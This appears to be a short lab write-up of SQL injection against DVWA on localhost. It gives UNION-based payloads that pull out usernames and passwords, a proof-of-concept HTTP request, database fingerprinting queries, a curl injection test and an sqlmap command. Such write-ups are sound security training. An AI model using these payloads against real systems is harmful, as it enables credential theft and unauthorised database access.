💥 Detailed Exploitation Analysis
1. Union-Based Data Extraction
Payload:

sql
1' UNION SELECT user, password FROM users-- -
Exploit Chain:

Identify injectable parameter (id)

Determine column count using ORDER BY

Locate string-compatible columns

Extract sensitive data via UNION

Proof of Concept:

http
GET /dvwa/vulnerabilities/sqli/?id=1'+UNION+SELECT+1,concat(user,0x3a,password)+FROM+users--+&Submit=Submit HTTP/1.1
Impact:

Exposed all user credentials

Database structure disclosure

2. Database Fingerprinting
Techniques Used:

sql
1' UNION SELECT 1,@@version-- -
1' UNION SELECT 1,user()-- -
1' UNION SELECT 1,database()-- -
Extracted Information:

text
Database Version: MariaDB 10.3.32
Current User: dvwa@172.17.0.1 
Database Name: dvwa
Risk Analysis:

Version disclosure enables targeted exploits

User context reveals privilege level

🧰 Exploitation Toolkit
Manual Testing
bash
# Basic injection test
curl -s "http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+1%3D1--+"

# Automated enumeration
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1" --cookie="PHPSESSID=abc123; security=low" --batch
